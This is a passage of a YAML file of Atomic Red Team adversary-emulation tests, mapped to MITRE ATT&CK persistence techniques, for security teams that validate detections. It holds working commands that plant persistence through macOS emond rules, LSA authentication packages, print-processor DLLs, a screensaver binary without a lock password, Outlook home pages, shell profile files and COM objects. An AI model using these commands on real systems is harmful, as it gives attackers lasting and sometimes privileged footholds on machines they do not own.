    - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_delete/registry_delete_schtasks_hide_task_via_sd_value_removal.yml
    - https://stackoverflow.com/questions/2913816/how-to-find-the-location-of-the-scheduled-tasks-folder
    mitre_related_techniques: []
  name: Scheduled Task Persistence via Eventviewer.msc
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 23c9c127-322b-4c75-95ca-eff464906114
  cleanup_command: 'sudo rm /etc/emond.d/rules/T1546.014_emond.plist

    sudo rm /private/var/db/emondClients/T1546.014

    '
  command: 'sudo cp "#{plist}" /etc/emond.d/rules/T1546.014_emond.plist

    sudo touch /private/var/db/emondClients/T1546.014

    '
  description: 'Establish persistence via a rule run by OSX''s emond (Event Monitor)
    daemon at startup, based on https://posts.specterops.io/leveraging-emond-on-macos-for-persistence-a040a2785124

    '
  get_prereq_command: ''
  input_arguments:
    plist:
      default: PathToAtomicsFolder/T1546.014/src/T1546.014_emond.plist
      description: Path to attacker emond plist file
      type: path
  mitre_info:
    mitre_data_sources:
    - 'File: File Creation'
    - 'Command: Command Execution'
    - 'Process: Process Creation'
    - 'File: File Modification'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may gain persistence and elevate privileges by
      executing malicious content triggered by the Event Monitor Daemon (emond). Emond
      is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts
      events from various services, runs them through a simple rules engine, and takes
      action. The emond binary at <code>/sbin/emond</code> will load any rules from
      the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly
      defined event takes place.


      The rule files are in the plist format and define the name, event type, and
      action to take. Some examples of event types include system startup and user
      authentication. Examples of actions are to run a system command or send an email.
      The emond service will not launch if there is no file present in the QueueDirectories
      path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)
      configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation:
      xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone
      macos persist Jun 2019)


      Adversaries may abuse this service by writing a rule to execute commands when
      a defined event occurs, such as system start up or user authentication.(Citation:
      xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone
      macos persist Jun 2019) Adversaries may also be able to escalate privileges
      from administrator to root as the emond service is executed with root privileges
      by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.'
    mitre_examples: []
    mitre_id: T1546.014
    mitre_mitigations: []
    mitre_name: Emond
    mitre_platforms:
    - macOS
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/014
    - http://www.magnusviri.com/Mac/what-is-emond.html
    - https://www.xorrior.com/emond-persistence/
    - https://www.sentinelone.com/blog/how-malware-persists-on-macos/
    mitre_related_techniques: []
  name: Persistance with Event Monitor - emond
  platforms:
  - macos
  prereq_command: ''
  references: []
- atomic_id: be2590e8-4ac3-47ac-b4b5-945820f2fbe9
  cleanup_command: 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"
    /v "Authentication Packages" /t REG_MULTI_SZ /d "msv1_0" /f

    rm -force C:\windows\system32\package.dll

    '
  command: 'Copy-Item "$PathToAtomicsFolder\T1547.002\bin\package.dll" C:\Windows\System32\

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Authentication
    Packages" /t REG_MULTI_SZ /d "msv1_0\0package.dll" /f

    '
  description: 'Establishes persistence using a custom authentication package for
    the Local Security Authority (LSA).

    After a reboot, Notepad.exe will be executed as child process of lsass.exe.

    Payload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package

    [Related blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)

    '
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources:
    - 'Command: Command Execution'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Module: Module Load'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may abuse authentication packages to execute DLLs
      when the system boots. Windows authentication package DLLs are loaded by the
      Local Security Authority (LSA) process at system start. They provide support
      for multiple logon processes and multiple security protocols to the operating
      system.(Citation: MSDN Authentication Packages)


      Adversaries can use the autostart mechanism provided by LSA authentication packages
      for persistence by placing a reference to a binary in the Windows Registry location
      <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\</code> with the key value of
      <code>"Authentication Packages"=&lt;target binary&gt;</code>. The binary will
      then be executed by the system when the authentication packages are loaded.'
    mitre_examples: []
    mitre_id: T1547.002
    mitre_mitigations: []
    mitre_name: Authentication Package
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/002
    - http://docplayer.net/20839173-Analysis-of-malicious-security-support-provider-dlls.html
    - https://technet.microsoft.com/en-us/library/dn408187.aspx
    - https://msdn.microsoft.com/library/windows/desktop/aa374733.aspx
    mitre_related_techniques: []
  name: Authentication Package
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: f7d38f47-c61b-47cc-a59d-fc0368f47ed0
  cleanup_command: 'net stop spooler

    rm -force C:\Windows\System32\spool\prtprocs\x64\AtomicTest.dll -ErrorAction SilentlyContinue

    rm -force C:\Users\Public\AtomicTest.txt -ErrorAction SilentlyContinue

    remove-item "HKLM:\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows
    x64\Print Processors\AtomicRedTeam" -Force -ErrorAction SilentlyContinue

    net start spooler

    '
  command: "if( $(get-service -Name spooler).StartType -eq \"Disabled\") {Set-Service\
    \ -Name \"spooler\" -StartupType Automatic}\nnet stop spooler\nCopy-Item \"$PathToAtomicsFolder\\\
    T1547.012\\bin\\AtomicTest.dll\" C:\\Windows\\System32\\spool\\prtprocs\\x64\\\
    AtomicTest.dll\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\\
    Windows x64\\Print Processors\\AtomicRedTeam\" /v \"Driver\" /d \"AtomicTest.dll\"\
    \ /t REG_SZ /f\nnet start spooler\nif(#{restart}){\n  Restart-Computer\n}\n"
  description: 'Establishes persistence by creating a new print processor registry
    key under HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows
    x64\Print Processors.

    The new print processor will point to a DLL which will be loaded by the spooler
    service after a reboot. The DLL will then create the file AtomicTest.txt in C:\Users\Public\
    as validation that the test is successful.


    Note: The test assumes a x64 Windows operating system.


    The payload source code is based on a blog post by stmxcsr: [https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)

    '
  get_prereq_command: ''
  input_arguments:
    restart:
      default: 0
      description: set to 1 if you want the computer to reboot as part of the test
      type: integer
  mitre_info:
    mitre_data_sources:
    - 'Windows Registry: Windows Registry Key Modification'
    - 'File: File Creation'
    - 'Driver: Driver Load'
    - 'Module: Module Load'
    - 'Process: OS API Execution'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may abuse print processors to run malicious DLLs
      during system boot for persistence and/or privilege escalation. Print processors
      are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during
      boot.(Citation: Microsoft Intro Print Processors)


      Adversaries may abuse the print spooler service by adding print processors that
      load malicious DLLs at startup. A print processor can be installed through the
      <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code>
      enabled. Alternatively, a print processor can be registered to the print spooler
      service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows
      architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code>
      Registry key that points to the DLL.


      For the malicious print processor to be correctly installed, the payload must
      be located in the dedicated system print-processor directory, that can be found
      with the <code>GetPrintProcessorDirectory</code> API call, or referenced via
      a relative path from this directory.(Citation: Microsoft AddPrintProcessor May
      2018) After the print processors are installed, the print spooler service, which
      starts during boot, must be restarted in order for them to run.(Citation: ESET
      PipeMon May 2020)


      The print spooler service runs under SYSTEM level permissions, therefore print
      processors installed by an adversary may run under elevated privileges.'
    mitre_examples: []
    mitre_id: T1547.012
    mitre_mitigations: []
    mitre_name: Print Processors
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1547/012
    - https://docs.microsoft.com/en-us/windows/win32/printdocs/addprintprocessor
    - https://learn.microsoft.com/windows-hardware/drivers/print/introduction-to-print-processors
    - https://www.welivesecurity.com/2020/05/21/no-game-over-winnti-group/
    mitre_related_techniques: []
  name: Print Processors
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 281201e7-de41-4dc9-b73d-f288938cbb64
  cleanup_command: 'reg import %userprofile%\backup.reg

    del %userprofile%\backup.reg

    del %SystemRoot%\System32\evilscreensaver.scr

    '
  command: 'reg export "HKEY_CURRENT_USER\Control Panel\Desktop" %userprofile%\backup.reg

    copy #{input_binary} "%SystemRoot%\System32\evilscreensaver.scr"

    reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ
    /d 1 /f

    reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t
    REG_SZ /d 60 /f

    reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t
    REG_SZ /d 0 /f

    reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ
    /d "%SystemRoot%\System32\evilscreensaver.scr" /f

    if #{reboot} NEQ 0 shutdown /r /t 0

    '
  description: 'This test copies a binary into the Windows System32 folder and sets
    it as the screensaver so it will execute for persistence. Requires a reboot and
    logon.

    '
  get_prereq_command: ''
  input_arguments:
    input_binary:
      default: C:\Windows\System32\cmd.exe
      description: Executable binary to use in place of screensaver for persistence
      type: path
    reboot:
      default: 0
      description: Set to non-zero value if you want the test to reboot the system
        so that changes take effect
      type: integer
  mitre_info:
    mitre_data_sources:
    - 'File: File Modification'
    - 'File: File Creation'
    - 'Command: Command Execution'
    - 'Process: Process Creation'
    - 'Windows Registry: Windows Registry Key Modification'
    mitre_defensive_measures: []
    mitre_description: 'Adversaries may establish persistence by executing malicious
      content triggered by user inactivity. Screensavers are programs that execute
      after a configurable time of user inactivity and consist of Portable Executable
      (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The
      Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>,
      and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with
      screensavers included with base Windows installations.


      The following screensaver settings are stored in the Registry (<code>HKCU\Control
      Panel\Desktop\</code>) and could be manipulated to achieve persistence:


      * <code>SCRNSAVE.exe</code> - set to malicious PE path

      * <code>ScreenSaveActive</code> - set to ''1'' to enable the screensaver

      * <code>ScreenSaverIsSecure</code> - set to ''0'' to not require a password
      to unlock

      * <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver
      is executed


      Adversaries can use screensaver settings to maintain persistence by setting
      the screensaver to run malware after a certain timeframe of user inactivity.(Citation:
      ESET Gazer Aug 2017)'
    mitre_examples: []
    mitre_id: T1546.002
    mitre_mitigations: []
    mitre_name: Screensaver
    mitre_platforms:
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/002
    - https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf
    - https://en.wikipedia.org/wiki/Screensaver
    mitre_related_techniques: []
  name: Set Arbitrary Binary as Screensaver
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 7a91ad51-e6d2-4d43-9471-f26362f5738e
  cleanup_command: 'reg.exe delete HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder}
    /v URL /f >nul 2>&1

    '
  command: 'reg.exe add HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder}
    /v URL /t REG_SZ /d #{url} /f

    '
  description: 'This test simulates persistence being added to a host via the Outlook
    Home Page functionality. This causes Outlook to retrieve URL containing a malicious
    payload every time the targeted folder is viewed.


    Triggering the payload requires manually opening Outlook and viewing the targetted
    folder (e.g. Inbox).

    '
  get_prereq_command: ''
  input_arguments:
    outlook_folder:
      default: Inbox
      description: Name of the Outlook folder to modify the homepage setting for
      type: string
    outlook_version:
      default: 16.0
      description: Version of Outlook that is installed
      type: float
    url:
      default: file://PathToAtomicsFolder\T1137.004\src\T1137.004.html
      description: URL to Outlook Home Page containing the payload to execute (can
        be local file:// or remote https://)
      type: string
  mitre_info:
    mitre_data_sources:
    - 'Application Log: Application Log Content'
    - 'Command: Command Execution'
    - 'Process: Process Creation'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may abuse Microsoft Outlook's Home Page feature\
      \ to obtain persistence on a compromised system. Outlook Home Page is a legacy\
      \ feature used to customize the presentation of Outlook folders. This feature\
      \ allows for an internal or external URL to be loaded and presented whenever\
      \ a folder is opened. A malicious HTML page can be crafted that will execute\
      \ code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page)\n\
      \nOnce malicious home pages have been added to the user\u2019s mailbox, they\
      \ will be loaded when Outlook is started. Malicious Home Pages will execute\
      \ when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook\
      \ Home Page)\n"
    mitre_examples: []
    mitre_id: T1137.004
    mitre_mitigations: []
    mitre_name: Outlook Home Page
    mitre_platforms:
    - Windows
    - Office Suite
    mitre_references:
    - https://attack.mitre.org/techniques/T1137/004
    - https://docs.microsoft.com/en-us/office365/securitycompliance/detect-and-remediate-outlook-rules-forms-attack
    - https://github.com/sensepost/notruler
    - https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/
    mitre_related_techniques: []
  name: Install Outlook Home Page Persistence
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 694b3cc8-6a78-4d35-9e74-0123d009e94b
  cleanup_command: 'sed -i "s/# Atomic Red Team was here! T1546.004//" /etc/profile

    '
  command: 'echo ''#{text_to_append}'' >> /etc/profile

    '
  description: 'An adversary may wish to establish persistence by executing malicious
    commands from the systems /etc/profile every time "any" user logs in.

    '
  get_prereq_command: ''
  input_arguments:
    text_to_append:
      default: '# Hello from Atomic Red Team T1546.004'
      description: Text to append to the /etc/profile file
      type: string
  mitre_info:
    mitre_data_sources: &id023
    - 'Process: Process Creation'
    - 'File: File Creation'
    - 'Command: Command Execution'
    - 'File: File Modification'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may establish persistence through executing malicious\
      \ commands triggered by a user\u2019s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s\
      \ execute several configuration scripts at different points throughout the session\
      \ based on events. For example, when a user opens a command-line interface or\
      \ remotely logs in (such as via SSH) a login shell is initiated. The login shell\
      \ executes scripts from the system (<code>/etc</code>) and the user\u2019s home\
      \ directory (<code>~/</code>) to configure the environment. All login shells\
      \ on a system use /etc/profile when initiated. These configuration scripts run\
      \ at the permission level of their directory and are often used to set environment\
      \ variables, create aliases, and customize the user\u2019s environment. When\
      \ the shell exits or terminates, additional shell scripts are executed to ensure\
      \ the shell exits appropriately. \n\nAdversaries may attempt to establish persistence\
      \ by inserting commands into scripts automatically executed by shells. Using\
      \ bash as an example, the default shell for most GNU/Linux systems, adversaries\
      \ may add commands that launch malicious binaries into the <code>/etc/profile</code>\
      \ and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation:\
      \ bencane blog bashrc) These files typically require root permissions to modify\
      \ and are executed each time any shell on a system launches. For user level\
      \ permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>,\
      \ <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when\
      \ a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation:\
      \ Linux manual bash invocation) Since the system only executes the first existing\
      \ file in the listed order, adversaries have used <code>~/.bash_profile</code>\
      \ to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code>\
      \ file which is additionally executed if the connection is established remotely\
      \ or an additional interactive shell is opened, such as a new tab in the command-line\
      \ interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation:\
      \ Magento) Some malware targets the termination of a program to trigger execution,\
      \ adversaries can use the <code>~/.bash_logout</code> file to execute malicious\
      \ commands at the end of a session. \n\nFor macOS, the functionality of this\
      \ technique is similar but may leverage zsh, the default shell for macOS 10.15+.\
      \ When the Terminal.app is opened, the application launches a zsh login shell\
      \ and a zsh interactive shell. The login shell configures the system environment\
      \ using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>,\
      \ and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation:\
      \ code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login\
      \ shell then configures the user environment with <code>~/.zprofile</code> and\
      \ <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code>\
      \ to configure the user environment. Upon exiting, <code>/etc/zlogout</code>\
      \ and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes\
      \ <code>/etc/bashrc</code> on startup."
    mitre_examples: []
    mitre_id: T1546.004
    mitre_mitigations: []
    mitre_name: Unix Shell Configuration Modification
    mitre_platforms: &id024
    - Linux
    - macOS
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/004
    - https://www.anomali.com/blog/pulling-linux-rabbit-rabbot-malware-out-of-a-hat
    - https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect
    - https://wiki.archlinux.org/index.php/Bash#Invocation
    - https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/
    - https://web.archive.org/web/20220316014323/http://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/
    - https://cedowens.medium.com/macos-ms-office-sandbox-brain-dump-4509b5fed49a
    - https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html
    - https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
    - https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5
    - https://github.com/D00MFist/PersistentJXA/blob/master/BashProfilePersist.js
    - https://objective-see.com/blog/blog_0x48.html
    - https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/
    mitre_related_techniques: []
  name: Append to the system shell profile
  platforms:
  - linux
  prereq_command: ''
  references: []
- atomic_id: bbdb06bc-bab6-4f5b-8232-ba3fbed51d77
  cleanup_command: 'sed -i "s/# Atomic Red Team was here... T1546.004//" ~/.profile

    '
  command: 'echo ''#{text_to_append}'' >> ~/.profile

    '
  description: 'An adversary may wish to establish persistence by executing malicious
    commands from the users ~/.profile every time the "user" logs in.

    '
  get_prereq_command: ''
  input_arguments:
    text_to_append:
      default: '# Atomic Red Team was here... T1546.004'
      description: Text to append to the ~/.profile file
      type: string
  mitre_info:
    mitre_data_sources: *id023
    mitre_defensive_measures: []
    mitre_description: "Adversaries may establish persistence through executing malicious\
      \ commands triggered by a user\u2019s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s\
      \ execute several configuration scripts at different points throughout the session\
      \ based on events. For example, when a user opens a command-line interface or\
      \ remotely logs in (such as via SSH) a login shell is initiated. The login shell\
      \ executes scripts from the system (<code>/etc</code>) and the user\u2019s home\
      \ directory (<code>~/</code>) to configure the environment. All login shells\
      \ on a system use /etc/profile when initiated. These configuration scripts run\
      \ at the permission level of their directory and are often used to set environment\
      \ variables, create aliases, and customize the user\u2019s environment. When\
      \ the shell exits or terminates, additional shell scripts are executed to ensure\
      \ the shell exits appropriately. \n\nAdversaries may attempt to establish persistence\
      \ by inserting commands into scripts automatically executed by shells. Using\
      \ bash as an example, the default shell for most GNU/Linux systems, adversaries\
      \ may add commands that launch malicious binaries into the <code>/etc/profile</code>\
      \ and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation:\
      \ bencane blog bashrc) These files typically require root permissions to modify\
      \ and are executed each time any shell on a system launches. For user level\
      \ permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>,\
      \ <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when\
      \ a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation:\
      \ Linux manual bash invocation) Since the system only executes the first existing\
      \ file in the listed order, adversaries have used <code>~/.bash_profile</code>\
      \ to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code>\
      \ file which is additionally executed if the connection is established remotely\
      \ or an additional interactive shell is opened, such as a new tab in the command-line\
      \ interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation:\
      \ Magento) Some malware targets the termination of a program to trigger execution,\
      \ adversaries can use the <code>~/.bash_logout</code> file to execute malicious\
      \ commands at the end of a session. \n\nFor macOS, the functionality of this\
      \ technique is similar but may leverage zsh, the default shell for macOS 10.15+.\
      \ When the Terminal.app is opened, the application launches a zsh login shell\
      \ and a zsh interactive shell. The login shell configures the system environment\
      \ using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>,\
      \ and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation:\
      \ code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login\
      \ shell then configures the user environment with <code>~/.zprofile</code> and\
      \ <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code>\
      \ to configure the user environment. Upon exiting, <code>/etc/zlogout</code>\
      \ and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes\
      \ <code>/etc/bashrc</code> on startup."
    mitre_examples: []
    mitre_id: T1546.004
    mitre_mitigations: []
    mitre_name: Unix Shell Configuration Modification
    mitre_platforms: *id024
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/004
    - https://www.anomali.com/blog/pulling-linux-rabbit-rabbot-malware-out-of-a-hat
    - https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect
    - https://wiki.archlinux.org/index.php/Bash#Invocation
    - https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/
    - https://web.archive.org/web/20220316014323/http://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/
    - https://cedowens.medium.com/macos-ms-office-sandbox-brain-dump-4509b5fed49a
    - https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html
    - https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
    - https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5
    - https://github.com/D00MFist/PersistentJXA/blob/master/BashProfilePersist.js
    - https://objective-see.com/blog/blog_0x48.html
    - https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/
    mitre_related_techniques: []
  name: Append commands user shell profile
  platforms:
  - linux
  prereq_command: ''
  references: []
- atomic_id: 8fe2ccfd-f079-4c03-b1a9-bd9b362b67d4
  cleanup_command: 'sed -i "s/# Atomic Red Team was here... T1546.004//" /etc/profile.d/bash_completion.sh

    '
  command: 'echo ''#{text_to_append}'' >> /etc/profile.d/bash_completion.sh

    '
  description: 'An adversary may wish to establish persistence by adding commands
    into any of the script files in the /etc/profile.d/ directory, which are executed
    every time "any" user logs in.

    '
  get_prereq_command: ''
  input_arguments:
    text_to_append:
      default: '# Atomic Red Team was here... T1546.004'
      description: Text to append to the /etc/profile.d/bash_completion.sh file
      type: string
  mitre_info:
    mitre_data_sources: *id023
    mitre_defensive_measures: []
    mitre_description: "Adversaries may establish persistence through executing malicious\
      \ commands triggered by a user\u2019s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s\
      \ execute several configuration scripts at different points throughout the session\
      \ based on events. For example, when a user opens a command-line interface or\
      \ remotely logs in (such as via SSH) a login shell is initiated. The login shell\
      \ executes scripts from the system (<code>/etc</code>) and the user\u2019s home\
      \ directory (<code>~/</code>) to configure the environment. All login shells\
      \ on a system use /etc/profile when initiated. These configuration scripts run\
      \ at the permission level of their directory and are often used to set environment\
      \ variables, create aliases, and customize the user\u2019s environment. When\
      \ the shell exits or terminates, additional shell scripts are executed to ensure\
      \ the shell exits appropriately. \n\nAdversaries may attempt to establish persistence\
      \ by inserting commands into scripts automatically executed by shells. Using\
      \ bash as an example, the default shell for most GNU/Linux systems, adversaries\
      \ may add commands that launch malicious binaries into the <code>/etc/profile</code>\
      \ and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation:\
      \ bencane blog bashrc) These files typically require root permissions to modify\
      \ and are executed each time any shell on a system launches. For user level\
      \ permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>,\
      \ <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when\
      \ a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation:\
      \ Linux manual bash invocation) Since the system only executes the first existing\
      \ file in the listed order, adversaries have used <code>~/.bash_profile</code>\
      \ to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code>\
      \ file which is additionally executed if the connection is established remotely\
      \ or an additional interactive shell is opened, such as a new tab in the command-line\
      \ interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation:\
      \ Magento) Some malware targets the termination of a program to trigger execution,\
      \ adversaries can use the <code>~/.bash_logout</code> file to execute malicious\
      \ commands at the end of a session. \n\nFor macOS, the functionality of this\
      \ technique is similar but may leverage zsh, the default shell for macOS 10.15+.\
      \ When the Terminal.app is opened, the application launches a zsh login shell\
      \ and a zsh interactive shell. The login shell configures the system environment\
      \ using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>,\
      \ and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation:\
      \ code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login\
      \ shell then configures the user environment with <code>~/.zprofile</code> and\
      \ <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code>\
      \ to configure the user environment. Upon exiting, <code>/etc/zlogout</code>\
      \ and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes\
      \ <code>/etc/bashrc</code> on startup."
    mitre_examples: []
    mitre_id: T1546.004
    mitre_mitigations: []
    mitre_name: Unix Shell Configuration Modification
    mitre_platforms: *id024
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/004
    - https://www.anomali.com/blog/pulling-linux-rabbit-rabbot-malware-out-of-a-hat
    - https://www.anomali.com/blog/illicit-cryptomining-threat-actor-rocke-changes-tactics-now-more-difficult-to-detect
    - https://wiki.archlinux.org/index.php/Bash#Invocation
    - https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/
    - https://web.archive.org/web/20220316014323/http://bencane.com/2013/09/16/understanding-a-little-more-about-etcprofile-and-etcbashrc/
    - https://cedowens.medium.com/macos-ms-office-sandbox-brain-dump-4509b5fed49a
    - https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html
    - https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/
    - https://posts.specterops.io/persistent-jxa-66e1c3cd1cf5
    - https://github.com/D00MFist/PersistentJXA/blob/master/BashProfilePersist.js
    - https://objective-see.com/blog/blog_0x48.html
    - https://www.intezer.com/blog/research/kaiji-new-chinese-linux-malware-turning-to-golang/
    mitre_related_techniques: []
  name: System shell profile scripts
  platforms:
  - linux
  prereq_command: ''
  references: []
- atomic_id: 752191b1-7c71-445c-9dbe-21bb031b18eb
  cleanup_command: 'Get-Process -Name "*calc" | Stop-Process

    '
  command: '$o= [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39"))

    $item = $o.Item()

    $item.Document.Application.ShellExecute("cmd.exe","/c calc.exe","C:\windows\system32",$null,0)

    '
  description: 'Use the PowerShell to execute COM CLSID object.

    Reference: https://pentestlab.blog/2020/05/20/persistence-com-hijacking/'
  get_prereq_command: ''
  input_arguments: {}
  mitre_info:
    mitre_data_sources: &id025
    - 'Process: Process Creation'
    - 'Module: Module Load'
    - 'Windows Registry: Windows Registry Key Modification'
    - 'Command: Command Execution'
    mitre_defensive_measures: []
    mitre_description: "Adversaries may establish persistence by executing malicious\
      \ content triggered by hijacked references to Component Object Model (COM) objects.\
      \ COM is a system within Windows to enable interaction between software components\
      \ through the operating system.(Citation: Microsoft Component Object Model)\
      \  References to various COM objects are stored in the Registry. \n\nAdversaries\
      \ can use the COM system to insert malicious code that can be executed in place\
      \ of legitimate software through hijacking the COM references and relationships\
      \ as a means for persistence. Hijacking a COM object requires a change in the\
      \ Registry to replace a reference to a legitimate system component which may\
      \ cause that component to not work when executed. When that system component\
      \ is executed through normal system operation the adversary's code will be executed\
      \ instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects\
      \ that are used frequently enough to maintain a consistent level of persistence,\
      \ but are unlikely to break noticeable functionality within the system as to\
      \ avoid system instability that could lead to detection. "
    mitre_examples: []
    mitre_id: T1546.015
    mitre_mitigations: []
    mitre_name: Component Object Model Hijacking
    mitre_platforms: &id026
    - Windows
    mitre_references:
    - https://attack.mitre.org/techniques/T1546/015
    - https://www.elastic.co/blog/how-hunt-detecting-persistence-evasion-com
    - https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence
    - https://msdn.microsoft.com/library/ms694363.aspx
    mitre_related_techniques: []
  name: Powershell Execute COM Object
  platforms:
  - windows
  prereq_command: ''
  references: []
- atomic_id: 33eacead-f117-4863-8eb0-5c6304fbfaa9
  cleanup_command: 'reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\AtomicTest" /f

    reg delete "HKEY_CURRENT_USER\SOFTWARE\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}"
